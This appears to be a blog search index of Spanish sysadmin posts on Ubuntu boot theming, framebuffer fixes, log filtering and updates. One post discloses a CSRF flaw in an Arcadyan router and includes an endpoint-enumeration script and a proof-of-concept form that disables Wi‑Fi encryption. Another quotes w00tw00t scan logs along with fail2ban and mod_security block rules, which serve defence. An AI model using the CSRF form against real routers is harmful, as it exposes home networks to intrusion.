Plymouth Instalamos algunos de los temas para Plymouth : bash $ sudo apt-get install plymouth-theme-{fade-in,glow,sabily,script,solar,spinfinity,text,ubuntu-logo,text} Cambiamos por el que queramos: bash $ sudo update-alternatives --config default.plymouth Y actualizamos el initramfs : bash $ sudo update-initramfs -u Cuando reiciniemos habremos cambiado el tema de Playmouth. Splashscreen de Grub2 Editamos el archivo /etc/grub.d/05_debian_theme , y modificamos la línea: bash WALLPAPER=\"/usr/share/images/desktop-base/moreblue-orbit-grub.png\" para que apunte a la ruta de la imagen que queramos. No hace falta que sea una del directorio /usr/share/images/grub , podemos crearla nosotros, pero debe respetar la resolución que tiene la pantalla del menú de Grub2, y que está espeficada en el archivo /etc/default/grub . Actualizamos grub2 bash $ sudo update-grub2 imagen de BlackMooon","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/18/personalizando-el-arranque-grafico-en-ubuntu-maverirk-meerkat/","loc":"https://karpoke.ignaciocano.com/2011/01/18/personalizando-el-arranque-grafico-en-ubuntu-maverirk-meerkat/"},{"title":"Solución de problemas con Plymouth y ATI en Ubuntu Maverick Meerkat","text":"Se conoce que tras actualizar a Maverick Meerkat , incluso de Karmic a Lucid, algo pasaba con Playmouth, de tal manera que utilizaba una resolución inadecuada. La solución parece depender en algunos casos de la tarjeta gráfica que tengamos, así que describiré la que me funcionó con una ATI Radeon : bash $ lspci | grep vga 01:00.0 VGA compatible controller: ATI Technologies Inc M92 [Mobility Radeon HD 4500 Series] Instalamos el paquete v86d : bash $ sudo aptitude install v86d Comprobamos las resoluciones que podemos poner: bash $ sudo hwinfo --framebuffer ```bash 02: None 00.0: 11001 VESA Framebuffer [Created at bios.464] Unique ID: rdCR.QOJHFkjgnM2 Hardware Class: framebuffer Model: \"(C) 1988-2005, ATI Technologies Inc. M92\" Vendor: \"(C) 1988-2005, ATI Technologies Inc. \" Device: \"M92\" SubVendor: \"ATI ATOMBIOS\" SubDevice: Revision: \"01.00\" Memory Size: 16 MB Memory Range: 0xd0000000-0xd0ffffff (rw) Mode 0x0300: 640x400 (+640), 8 bits Mode 0x0301: 640x480 (+640), 8 bits Mode 0x0303: 800x600 (+832), 8 bits Mode 0x0305: 1024x768 (+1024), 8 bits Mode 0x0307: 1280x1024 (+1280), 8 bits Mode 0x0310: 640x480 (+1280), 15 bits Mode 0x0311: 640x480 (+1280), 16 bits Mode 0x0313: 800x600 (+1600), 15 bits Mode 0x0314: 800x600 (+1600), 16 bits Mode 0x0316: 1024x768 (+2048), 15 bits Mode 0x0317: 1024x768 (+2048), 16 bits Mode 0x0319: 1280x1024 (+2560), 15 bits Mode 0x031a: 1280x1024 (+2560), 16 bits Mode 0x030d: 320x200 (+640), 15 bits Mode 0x030e: 320x200 (+640), 16 bits Mode 0x0320: 320x200 (+1280), 24 bits Mode 0x0393: 320x240 (+320), 8 bits Mode 0x0395: 320x240 (+640), 16 bits Mode 0x0396: 320x240 (+1280), 24 bits Mode 0x03b3: 512x384 (+512), 8 bits Mode 0x03b5: 512x384 (+1024), 16 bits Mode 0x03b6: 512x384 (+2048), 24 bits Mode 0x03c3: 640x350 (+640), 8 bits Mode 0x03c5: 640x350 (+1280), 16 bits Mode 0x03c6: 640x350 (+2560), 24 bits Mode 0x0333: 720x400 (+768), 8 bits Mode 0x0335: 720x400 (+1472), 16 bits Mode 0x0336: 720x400 (+2944), 24 bits Mode 0x0353: 1152x864 (+1152), 8 bits Mode 0x0355: 1152x864 (+2304), 16 bits Mode 0x0356: 1152x864 (+4608), 24 bits Mode 0x0363: 1280x960 (+1280), 8 bits Mode 0x0365: 1280x960 (+2560), 16 bits Mode 0x0366: 1280x960 (+5120), 24 bits Mode 0x0321: 640x480 (+2560), 24 bits Mode 0x0322: 800x600 (+3200), 24 bits Mode 0x0323: 1024x768 (+4096), 24 bits Mode 0x0324: 1280x1024 (+5120), 24 bits Mode 0x0343: 1400x1050 (+1408), 8 bits Mode 0x0345: 1400x1050 (+2816), 16 bits Mode 0x0346: 1400x1050 (+5632), 24 bits Config Status: cfg=new, avail=yes, need=no, active=unknown ``` Escogemos, por ejemplo, 1280x960. Editamos el fichero /etc/default/grub y modificamos la linea: bash GRUB_CMDLINE_LINUX_DEFAULT por bash GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash nomodeset video=uvesafb:mode_option=1280x960-24,mtrr=3,scroll=ywrap\" Y añadimos, debajo de la línea comentada que comienza por GRUB_GFXMODE : bash GRUB_GFXMODE=1280x960 Ahora añadimos al fichero /etc/initramfs-tools/modules : bash uvesafb mode_option=1280x960-24 mtrr=3 scroll=ywrap Forzamos a usar el framebuffer en el arranque: bash $ echo FRAMEBUFFER=y | sudo tee /etc/initramfs-tools/conf.d/splash Actualizamos grub2 y initramfs : bash $ sudo update-grub2 $ sudo update-initramfs -u Y cuando reiniciemos ya estará solucionado. vga=769 deprecated Sin embargo, tenía otro problema con el arranque y es que me aparecía el siguiente mensaje de error: bash Error \"vga=769 is deprecated. Para solucionarlo, editamos nuevamente el archivo /etc/default/grub y modificamos la línea: bash GRUB_CMDLINE_LINUX=\" vga=769\" por bash GRUB_CMDLINE_LINUX=\" gfxpayload=true gfxpayload=1280x960x24\" Cuando reiniciemos ya estará solucionado. \"actualizar a maverick meerkat de forma remota\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/18/solucion-de-problemas-con-plymouth-y-ati-en-ubuntu-maverick-meerkat/","loc":"https://karpoke.ignaciocano.com/2011/01/18/solucion-de-problemas-con-plymouth-y-ati-en-ubuntu-maverick-meerkat/"},{"title":"w00t w00t","text":"Si revisamos los logs del servidor web, de vez en cuando aparecen toda una serie de peticiones del tipo: 193.108.81.203 - - [12/Jan/2011:16:48:31 +0100] \"GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1\" 404 488 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:34 +0100] \"GET /db/scripts/setup.php HTTP/1.1\" 404 471 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:35 +0100] \"GET /mysql/scripts/setup.php HTTP/1.1\" 404 473 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:35 +0100] \"GET /typo3/phpmyadmin/scripts/setup.php HTTP/1.1\" 404 480 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:38 +0100] \"GET /phpmyadmin/scripts/setup.php HTTP/1.1\" 404 477 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:38 +0100] \"GET /pma/scripts/setup.php HTTP/1.1\" 404 472 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:39 +0100] \"GET /web/phpMyAdmin/scripts/setup.php HTTP/1.1\" 404 479 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:39 +0100] \"GET /xampp/phpmyadmin/scripts/setup.php HTTP/1.1\" 404 480 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:39 +0100] \"GET /web/scripts/setup.php HTTP/1.1\" 404 472 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:39 +0100] \"GET /websql/scripts/setup.php HTTP/1.1\" 404 474 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:40 +0100] \"GET /webadmin/scripts/setup.php HTTP/1.1\" 404 476 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:40 +0100] \"GET /sqlweb/scripts/setup.php HTTP/1.1\" 404 474 \"-\" \"ZmEu\" 193.108.81.203 - - [12/Jan/2011:16:48:40 +0100] \"GET /websql/scripts/setup.php HTTP/1.1\" 404 474 \"-\" \"ZmEu\" En este caso, la IP parece ser del Reino Unido , pero va variando, así como la petición característica que hace al principio y el user agent del final, \" Zemu \". En otras ocasiones, la petición es /w00tw00t.at.ISC.SANS.DFind:) . Es algo que ya lleva un tiempo por el mundo, ya que se pueden encontrar referencias en Google de cómo mínimo un par de años. Podemos filtrar y bloquear esta clase de escaneos de varias maneras. iptables Con iptables , a través de un script que bloquea la IP automáticamente, aunque se deben crear una reglas previamente y programar su ejecución periódica en el cron . Con iptables , para bloquear una IP concreta, ejecutamos: bash $ sudo iptables -I INPUT -s 193.108.81.203 -j DROP Ahora vamos a crear las reglas que necesita el script : bash $ sudo iptables -N drop_w00t $ sudo iptables -A INPUT -j drop_w00t $ sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT Guardaremos las reglas y las haremos permanentes ejecutando: bash $ sudo iptables-save También podemos incluir una IP en la cadena que acabamos de crear: bash $ sudo iptables -A drop_w00t -s 211.94.188.52 -j DROP Podemos ver las IP bloqueadas en este momento (el argumento -n nos muestra las IPs, si no lo ponemos nos saldrá el dominio al que resuelve la IP, si es que lo hay): ```bash $ sudo iptables -L drop_w00t -n Chain drop_w00t (1 references) target prot opt source destination DROP all -- 193.108.81.203 0.0.0.0/0 DROP all -- 62.215.201.252 0.0.0.0/0 DROP all -- 80.232.176.202 0.0.0.0/0 DROP all -- 92.243.22.73 0.0.0.0/0 DROP all -- 211.94.188.52 0.0.0.0/0 DROP all -- 116.255.163.100 0.0.0.0/0 ``` Si queremos borrar una regla, primero averiguamos qué número tiene: bash $ sudo iptables -L INPUT -n --line-numbers bash Y después borramos la regla usando ese número: bash $ sudo iptables -D INPUT [número] bash Podemos borrar una IP bloqueada dentro de una regla: bash $ sudo iptables -D drop_w00t [número] bash fail2ban También se puede filtrar con fail2ban , añadiendo una nueva opción . A partir de la versión 0.8.1 ya están definidas las acciones necesarias a llevar a cabo con iptables . Si tenemos una versión anterior, podemos seguir los pasos previos definidos en el enlace anterior. Lo primero es crear un filtro, /etc/fail2ban/filter.d/apache-w00tw00t.conf : # 193.108.81.203 - - [12/Jan/2011:16:48:31 +0100] \"GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1\" 404 488 \"-\" \"ZmEu\" [Definition] # Option: failregex # Notes.: regex to match the w00tw00t scan messages in the logfile. The # host must be matched by a group named \"host\". The tag \"\" can # be used for standard IP/hostname matching. # Values: TEXT failregex = &#94; -._\"GET \\/w00tw00t\\.at.*\"._ # Option: ignoreregex # Notes.: regex to ignore. If this regex matches, the line is ignored. # Values: TEXT ignoreregex = Declaramos el filtro en /etc/fail2ban/jail.conf para que si detecta el escaneo en el fichero de log del Apache, banee al usuario durante un tiempo: [apache-w00tw00t] enabled = true filter = apache-w00tw00t action = iptables-allports[name=w00tw00t] mail-whois[name=w00tw00t, dest=] logpath = /var/log/apache2/other_vhosts_access.log maxretry = 1 bantime = 86400 mod_security Y por último, también se puede utilizar mod_security , añadiendo las siguientes reglas : SetEnvIfNoCase Request_URI \"w00tw00t.at.blackhats.romanian.anti-sec\" drop SetEnvIfNoCase Request_URI \"w00tw00t.at.ISC.SANS.DFind\" drop SetEnvIfNoCase Request_URI \"w00tw00t.at.ISC.SANS.test0\" drop Lo malo es que mod_security no nos protegerá de esa IP contra otros servicios.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/17/w00t-w00t/","loc":"https://karpoke.ignaciocano.com/2011/01/17/w00t-w00t/"},{"title":"pci_add_option_rom: failed to find romfile \"pxe-rtl8139.bin\"","text":"Trasteando con qemu y Damn Small Linux , creamos una imagen de disco de 500 MB: bash $ qemu-img create -f qcow hd-500m.img 500M Y lanzamos el programa: bash $ qemu -hda hd-500m.img -cdrom dsl-4.4.10.iso -boot d -m 128 -localtime En seguida nos aparece el siguiente mensaje: bash pci_add_option_rom: failed to find romfile \"pxe-rtl8139.bin\" El error que aparece, aunque no evita que la distribución arranque, se debe a que en Ubuntu, por defecto, no están instalados los binarios para permitir que el sistema operativo emulado arranque por red. La solución es instalar el paquete kvm-pxe : bash $ sudo aptitude install kvm-pxe","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/14/pci_add_option_rom-failed-to-find-romfile-pxe-rtl8139-bin/","loc":"https://karpoke.ignaciocano.com/2011/01/14/pci_add_option_rom-failed-to-find-romfile-pxe-rtl8139-bin/"},{"title":"Optimizar el rendimiento de Flash","text":"Leyendo el blog Usemos Linux , veo que podemos optimizar el rendimiento del uso de Flash , configurando el complemento para que no realice algunas comprobaciones de la GPU, con lo que se alivia el consumo de CPU y de memoria. Sin embargo, no en todos los casos se conseguirá esta mejora del rendimiento. Esto dependerá de: el contenido debe estar preparado para utilizar la GPU, de lo contrario, la reproducción hasta podría volverse más lenta. los requerimientos de hardware para la GPU en el modo GPU son importantes. no se puede garantizar la fidelidad de los píxels , ya que podrían cambiar de color. no importa si el frame rate está por encima de 60, nunca será superior. De hecho, podemos esperar que sea entre 50 y 55 fps. no se debería usar, o abusar, del modo GPU para todo el contenido Flash que se utilice en una página, ya que degradaría bastante la respuesta del navegador. el rendimiento también depende de los fabricantes y sus controladores. Para configurar el complemento, deberemos crear el fichero de configuración mms.cfg . Ejecutamos: bash $ sudo mkdir /etc/adobe $ echo \"OverrideGPUValidation=true\" | sudo tee /etc/adobe/mms.cfg También podemos configurarlo como preferencias de usuario: bash $ mkdir ~/adobe $ echo \"OverrideGPUValidation=true\" >> ~/.adobe/mms.cfg","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/11/optimizar-el-rendimiento-de-flash/","loc":"https://karpoke.ignaciocano.com/2011/01/11/optimizar-el-rendimiento-de-flash/"},{"title":"kernel time sync status change","text":"Tras instalar logcheck , un programa que escanea los ficheros de log del sistema en busca de \"líneas interesantes\", comencé a recibir demasiados avisos del tipo: bash Jan 7 02:04:38 terminus ntpd[1117]: kernel time sync status change 6001 \"1117\" Jan 7 02:21:44 terminus ntpd[1117]: kernel time sync status change 2001 \"1117\" Estos cambios son debidos a que ntp cambia dinámicamente entre los modo FLL y el PLL , lo que le permite tener en cuenta la latencia de la red o el jitter a la hora de actualizar el reloj del sistema. Por lo tanto, los mensajes son inofensivos, y si queremos que no nos lleguen más, deberemos cambiar una regla que se encuentra en el fichero /etc/logcheck/ignore.d.server/ntp (si el modo en que trabaja logcheck es server y así está especificado en el fichero /etc/logcheck/logcheck.conf ). Cambiaremos: bash &#94;\\w{3} [ :0-9]{11} [._[:alnum:]-]+ ntpd\\[[0-9]+\\]: kernel time sync (disabled|enabled) [0-9]+$ \" :0-9]{11} [._[:alnum:]-]+ ntpd\\[[0-9]+\\\" por: bash &#94;\\w{3} [ :0-9]{11} [._[:alnum:]-]+ ntpd\\[[0-9]+\\]: kernel time sync (disabled|enabled|status change) [0-9]+$ \" :0-9]{11} [._[:alnum:]-]+ ntpd\\[[0-9]+\\\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/07/kernel-time-sync-status-change/","loc":"https://karpoke.ignaciocano.com/2011/01/07/kernel-time-sync-status-change/"},{"title":"Actualizando Ubuntu a la última distribución de forma remota","text":"Instalamos el paquete update-manager , si es que no lo teníamos: bash $ sudo aptitude install update-manager Comprobamos que el fichero /etc/update-manager/release-upgrades contiene: bash Prompt=normal Si contiene Prompt=lts sólo nos actualizará si hay una LTS nueva. Si contiene Prompt=never ... no actualizará nada. Y ejecutamos el comando do-release-upgrade : bash $ sudo do-release-upgrade » ubuntugeek","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/07/actualizando-ubuntu-a-la-ultima-distribucion-de-forma-remota/","loc":"https://karpoke.ignaciocano.com/2011/01/07/actualizando-ubuntu-a-la-ultima-distribucion-de-forma-remota/"},{"title":"CSRF en el panel de administración del router Arcadyan de ya.com","text":"El router es un Arcadyan, modelo Astoria AVR4518PW. Y parece que es vulnerable a ataques CSRF. Si tienes este router y has iniciado sesión en el panel de administración, pulsando en el siguiente enlace se cerrará la sesión de usuario . Si has cambiado la IP por defecto, 192.168.2.1, no funcionará, pero lo puedes probar escribiendo en la barra de direcciones del navegador: javascript javascript:document.location.href='http://192.168.2.1/cgi-bin/logout.exe' **INCLUSO si lo haces desde un navegador distinto al que tengas abierta la página de administración del router , o desde la consola!!!__ Por lo que supongo que el router, una vez autenticado el usuario desde una IP, autoriza cualquier petición que provenga desde esa IP. El panel de administración web está compuesto de marcos, uno que contiene el menú, otro que tiene la parte superior de la página y otro en el que se carga la página de cada una de las secciones. Para ver cuales son estas páginas, mientras hayamos iniciado sesión, podemos inspeccionar el código fuente de la página del menú desde la consola. bash $ curl http://192.168.2.1/menu.stm | grep -Eo [a-z_-]+.stm | sort bash adsl_main.stm adsl_para.stm adsl_para.stm adsl_status.stm advanced_user_p.stm arcor_network.stm arcor_network.stm atmpvc.stm atmpvc_ya.stm atmpvc_ya.stm clone.stm ddns_main.stm ddns_main.stm dns_proxy.stm firewall_a.stm firewall_d.stm firewall_mac.stm firewall_main.stm firewall_rule.stm firewall_spi_h.stm firewall_u.stm info_voip.stm iptv_main.stm lan_main.stm menu.stm nat_main.stm nat_m.stm nat_sp.stm nat_v.stm pin_code.stm pingtest.stm qos_clsmap.stm qos_main.stm qos_stats.stm r_mort.stm route_main.stm route_tbl.stm r_rip.stm setup_dns.stm setupw.stm snmp_community.stm snmp_main.stm snmp_trap.stm status_main.stm system_c.stm system_f.stm system_main.stm system_p.stm system_remote_mgmt.stm system_r.stm system.stm system_t.stm telephony_voip.stm tl_main.stm upnp_main.stm upnp_main.stm usb_fsrv.stm usb_ftp_server.stm usb_main.stm usb_modem.stm usb_pr_server.stm usb_wftp_server.stm v_lan.stm voip_account_ya.stm voip_advanced.stm voip_adv_port.stm voip_call_allocation.stm voip_call_allocation.stm voip_dial.stm voip_extension_out.stm voip_extension.stm voip_isdn_msn.stm voip_main.stm voip_numbers_act.stm voip_numbers_act.stm voip_num_plan.stm voip_phone.stm voip_quick_dial.stm voip_sip.stm voip_status.stm wan_main.stm wan_main.stm wireless_e.stm wireless_e.stm wireless_id.stm wireless_mac.stm wireless_main.stm wireless_wds.stm Vamos a ver en cuáles de estas páginas se hacen llamadas a scripts , como el que vimos antes. Debemos haber iniciado sesión para que funcione lo siguiente: bash $ for url in $(curl -s http://192.168.2.1/menu.stm | grep -Eo [a-z_-]+.stm | sort); do echo \"En $url\" curl -s http://192.168.2.1/$url | grep -Eo \"/cgi-bin/[a-z_-]*\\.exe\"; done bash En adsl_main.stm En adsl_para.stm /cgi-bin/aadsl.exe En adsl_para.stm /cgi-bin/aadsl.exe En adsl_status.stm /cgi-bin/setup_pass.exe En advanced_user_p.stm En arcor_network.stm /cgi-bin/arcor_network.exe En arcor_network.stm /cgi-bin/arcor_network.exe En atmpvc.stm En atmpvc_ya.stm /cgi-bin/atmprofile.exe En atmpvc_ya.stm /cgi-bin/atmprofile.exe En clone.stm /cgi-bin/clMac.exe En ddns_main.stm /cgi-bin/setup_ddns.exe En ddns_main.stm /cgi-bin/setup_ddns.exe En dns_proxy.stm /cgi-bin/dnsproxy_eb.exe En firewall_a.stm /cgi-bin/aoaccdel.exe /cgi-bin/ac_control.exe En firewall_d.stm /cgi-bin/setup_dmz.exe En firewall_mac.stm /cgi-bin/macac_control.exe En firewall_main.stm /cgi-bin/fire_eb.exe En firewall_rule.stm /cgi-bin/aoschdel.exe /cgi-bin/setup_sch.exe En firewall_spi_h.stm /cgi-bin/firewall_SPI.exe En firewall_u.stm /cgi-bin/Aurlbk.exe En info_voip.stm En iptv_main.stm /cgi-bin/iptv_eb.exe En lan_main.stm /cgi-bin/setup_lan.exe /cgi-bin/setup_lan.exe En menu.stm /cgi-bin/nat_show.exe En nat_main.stm /cgi-bin/nat_eb.exe En nat_m.stm /cgi-bin/setup_fix_pat.exe En nat_sp.stm /cgi-bin/nat_sp.exe En nat_v.stm /cgi-bin/setup_virtualser.exe En pin_code.stm /cgi-bin/setup_pincode.exe En pingtest.stm /cgi-bin/ping_test.exe En qos_clsmap.stm En qos_main.stm En qos_stats.stm En r_mort.stm En route_main.stm En route_tbl.stm /cgi-bin/ArouteNew.exe /cgi-bin/ArouteNew.exe En r_rip.stm /cgi-bin/Arip.exe En setup_dns.stm /cgi-bin/setup_dns.exe En setupw.stm En snmp_community.stm En snmp_main.stm En snmp_trap.stm En status_main.stm /cgi-bin/statusprocess.exe /cgi-bin/statusprocess.exe En system_c.stm /cgi-bin/setup_config_data.exe En system_f.stm /cgi-bin/upgrade.exe En system_main.stm /cgi-bin/system_main.exe En system_p.stm /cgi-bin/setup_pass.exe En system_remote_mgmt.stm /cgi-bin/setup_remote_mgmt.exe En system_r.stm /cgi-bin/restart.exe En system.stm En system_t.stm /cgi-bin/ntp_setting.exe En telephony_voip.stm /cgi-bin/voip_acc_clr.exe /cgi-bin/voip_account.exe En tl_main.stm En upnp_main.stm /cgi-bin/upnp_eb.exe En upnp_main.stm /cgi-bin/upnp_eb.exe En usb_fsrv.stm /cgi-bin/setup_disk.exe En usb_ftp_server.stm /cgi-bin/setup_ftp.exe En usb_main.stm /cgi-bin/usb.exe En usb_modem.stm /cgi-bin/usb_modem.exe En usb_pr_server.stm /cgi-bin/setup_pr.exe En usb_wftp_server.stm /cgi-bin/setup_wftp.exe En v_lan.stm /cgi-bin/switch_vlan_delete.exe /cgi-bin/switch_vlan_delete.exe /cgi-bin/switch_vlan_delete.exe En voip_account_ya.stm /cgi-bin/voip_account_edit.exe En voip_advanced.stm En voip_adv_port.stm En voip_call_allocation.stm /cgi-bin/voip-call-allocation.exe En voip_call_allocation.stm /cgi-bin/voip-call-allocation.exe En voip_dial.stm En voip_extension_out.stm /cgi-bin/voip-ext-out.exe En voip_extension.stm En voip_isdn_msn.stm /cgi-bin/voip-isdn-msn.exe En voip_main.stm En voip_numbers_act.stm /cgi-bin/voip-call-out.exe En voip_numbers_act.stm /cgi-bin/voip-call-out.exe En voip_num_plan.stm En voip_phone.stm /cgi-bin/voip-phone.exe En voip_quick_dial.stm En voip_sip.stm En voip_status.stm /cgi-bin/del_call_log.exe En wan_main.stm /cgi-bin/setup_wan.exe En wan_main.stm /cgi-bin/setup_wan.exe En wireless_e.stm /cgi-bin/wps_set.exe /cgi-bin/wireless_e.exe /cgi-bin/wireless_wep.exe /cgi-bin/wireless_wpa.exe En wireless_e.stm /cgi-bin/wps_set.exe /cgi-bin/wireless_e.exe /cgi-bin/wireless_wep.exe /cgi-bin/wireless_wpa.exe En wireless_id.stm /cgi-bin/wireless_ssid.exe En wireless_mac.stm /cgi-bin/add_cur_mac.exe /cgi-bin/wireless_f.exe En wireless_main.stm /cgi-bin/wireless_eb.exe En wireless_wds.stm /cgi-bin/wireless_wds.exe Faltan los del menú superior: bash $ curl http://192.168.2.1/setupa_top.stm | grep -Eo \"/cgi-bin/[a-z_-]*\\.exe\" /cgi-bin/logout.exe /cgi-bin/change_language.exe Una de las primeras cosas que he probado es que es posible deshabilitar el cifrado para la red inalámbrica. Si creamos un formulario como este: html <form action=\"http://192.168.2.1/cgi-bin/wireless_e.exe\" method=\"post\"> <input type=\"text\" name=\"changewep\" value=\"0\"> <input type=\"text\" name=\"client_type\" value=\"0\"> <input type=\"text\" name=\"wpa_authen\" value=\"0\"> <input type=\"text\" name=\"do_submit\" value=\"1\"> <input type=\"text\" name=\"wps_enable\"> <input type=\"text\" name=\"vap\" value=\"0\"> <input type=\"text\" name=\"cur_vap\" value=\"0\"> <input type=\"text\" name=\"securitytype\" value=\"2\"> <input type=\"submit\" value=\"submit\"> </form> El campo cur_vap se refiere al punto de acceso inalámbrico; el router permite tener dos. Y el campo securitytype se refiere al tipo de cifrado que queremos. Los valores que puede tomar este campo son: | securitytype | Tipo de cifrado| |--------------|----------------| | 0 | WPA/WPA2 | | 1 | WEP | | 2 | Deshabilitado| | 3 | Sólo WPA | | 4 | Sólo WPA2 | En función del tipo de cifrado, tendremos que utilizar otros campos y otros action para el formulario. Aquí hay una prueba de concepto , aunque el action del formulario tiene la IP por defecto del router, 192.168.2.1.","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/01/01/csrf-en-el-panel-de-administracion-del-router-arcadyan-de-ya-com/","loc":"https://karpoke.ignaciocano.com/2011/01/01/csrf-en-el-panel-de-administracion-del-router-arcadyan-de-ya-com/"},{"title":"Asignar la IP que queramos a un dominio de DynDNS","text":"Con el comando inadyn podemos actualizar la IP de nuestro dominio, o dominios , en DynDNS, pero la IP no se pasa como argumento sino que se hace una consulta a un servidor que devuelve la IP pública que tenemos en ese momento. Por defecto, el servidor es checkip.dyndns.org:80 . Podemos hacer que el dominio apunte a la IP que queramos utilizando el argumento --ip_server_name para especificar un servidor controlado por nosotros y que devuelva la IP que queramos. Una manera sencilla de montar un servidor HTTP temporal es utilizar el comando nc . Antes de ejecutarlo, crearemos un fichero index.html con el siguiente contenido, modificando la IP por la que nosotros queramos: html Current IP Check Current IP Address: 209.85.146.106 Lanzamos el servidor: python $ cat index.html | nc -l 8000 Y actualizamos nuestro dominio con la IP que pusimos en el archivo index.html : bash $ /usr/sbin/inadyn -u user -p pass --iterations 1 --dyndns_system custom@dyndns.org --ip_server_name localhost:8000 / -a anacreonte.homelinux.com Ojo, no es recomendable ir escribiendo nuestras contraseñas en la línea de comandos. Bueno, después de hacer algunas pruebas más, he visto que no hace falta crear un fichero HTML, basta con que nuestro servidor devuelva la IP que queremos asignar: bash $ echo 209.85.146.106 | nc -l 8000 Otra manera sería utilizar un Apache, en el cual el fichero no tiene porqué estar en la raíz del dominio. En tal caso, la petición sería algo como: bash $ /usr/sbin/inadyn -u user -p pass --iterations 1 --dyndns_system custom@dyndns.org --ip_server_name smyrno.homelinux.com:8000 /path/ip.html -a anacreonte.homelinux.com donde el fichero ip.html es el que contiene la IP y se encuentra en el subdirectorio /path/ . Por último, también he probado con Python, ejecutando: python $ python -m SimpleHTTPServer 8000 pero esto no acaba de funcionar. inadyn una vez conectado al servidor realiza una petición que siempre recibe un error 404, dado que el archivo solicitado no se encuentra. Para mostrar este comportamiento, lazamos el servidor: bash $ python -m SimpleHTTPServer 8000 y en otra consola intentamos realizar la actualización: bash $ /usr/sbin/inadyn -u user -p pass --iterations 1 --dyndns_system custom@dyndns.org --ip_server_name localhost:8000 / -a anacreonte.homelinux.com --verbose 5 ```bash INADYN: Started 'INADYN version 1.96.2' - dynamic DNS updater. The request for IP server: GET http://localhost:8000/ HTTP/1.0 DYNDNS: IP server response: HTTP/1.0 404 File not found Server: SimpleHTTP/0.6 Python/2.6.6 Date: Thu, 30 Dec 2010 16:43:31 GMT Content-Type: text/html Connection: close Error response Error response Error code 404. Message: File not found. Error code explanation: 404 = Nothing matches the given URI. W:'RC_DYNDNS_INVALID_RSP_FROM_IP_SERVER' (0x42) updating the IPs. (it 0) ``` Este es el registro que muestra el servidor: bash Serving HTTP on 0.0.0.0 port 8000 ... localhost.localdomain - - [30/Dec/2010 17:43:31] code 404, message File not found localhost.localdomain - - [30/Dec/2010 17:43:31] \"GET http://localhost:8000/ HTTP/1.0\" 404 - Sin embargo, si abrimos un navegador y vamos a la direccion localhost:8000 , en el navegador nos aparece la IP y esto es lo que muestra el servidor: bash localhost.localdomain - - [30/Dec/2010 17:51:15] \"GET / HTTP/1.1\" 200 - Actualizado el 10 de junio de 2013 Actualmente, es posible actualizar el dominio con la IP que queramos , simplemente haciendo una petición como la siguiente: bash $ USERNAME=username $ PASSWORD=password $ DOMAIN=example.homelinux.com $ IP=1.2.3.4 $ curl https://$USERNAME:$PASSWORD@members.dyndns.org/nic/update?hostname=$DOMAIN&myip=$IP&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG Debido a un cambio en la política de uso de las cuentas gratuitas, es necesario iniciar sesión mínimo una vez al mes para mantener los dominios.","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/12/30/asignar-la-ip-que-queramos-a-un-dominio-de-dyndns/","loc":"https://karpoke.ignaciocano.com/2010/12/30/asignar-la-ip-que-queramos-a-un-dominio-de-dyndns/"},{"title":"La infame actualización de WordPress en 15 segundos","text":"Copia de respaldo de la base de datos . Entre el flag -u y el nombre de usuario no debe haber ningún espacio. Ojo, se bloquearán las tablas hasta que termine. Y otro ojo, no es muy recomendable escribir la contraseña directamente en la línea de comandos. Si sólo ponemos el flag -p , se nos pedirá la contraseña para el usuario proporcionado. bash $ /usr/bin/mysqldump -uuser -p --all-databases | gzip > mysql-$(date +%F).tgz Copia de respaldo de los archivos . Tanto del directorio wp-uploads como del directorio wordpress . bash $ tar -cvzf wordpress-$(date +%F).tgz /usr/share/wordpress $ tar -cvzf wp-uploads-$(date +%F).tgz /var/www/wp-uploads Desactivamos todos los plugins desde el panel de control. Eliminamos los subdirectorios wp-admin y wp-includes . bash $ cd /usr/share/wordpress $ sudo rm -fr wp-admin wp-includes Instalamos la última versión. bash $ wget -NP /tmp http://wordpress.org/latest.zip $ sudo unzip /tmp/latest.zip -d /usr/share # yes to [A]ll Comprobamos si se debe actualizar la base de datos de WordPress . En principio, basta ir al panel de administración y ahí nos aparecerá un mensaje diciéndonos que es necesario actualizar la base de datos y que visitemos la página /wp-admin/upgrade.php para realizar dicha actualización. En una sola línea: bash $ /usr/bin/mysqldump -uuser -p --all-databases | gzip > mysql-$(date +%F).tgz && tar -cvzf wordpress-$(date +%F).tgz /usr/share/wordpress && tar -cvzf wp-uploads-$(date +%F).tgz /var/www/wp-uploads && cd /usr/share/wordpress && sudo rm -fr wp-admin wp-includes && wget -NP /tmp http://wordpress.org/latest.zip && sudo unzip /tmp/latest.zip -d /usr/share más info: Actualizando WordPress Actualizado el 31 de diciembre de 2010 5 segundos más para actualizar las traducciones, debemos especificar el número de versión y el idioma. Por ejemplo: bash $ wget -NP /tmp http://es.wordpress.org/wordpress-3.0.4-es_ES.zip $ sudo unzip /tmp/wordpress-3.0.4-es_ES.zip -d /usr/share # yes to 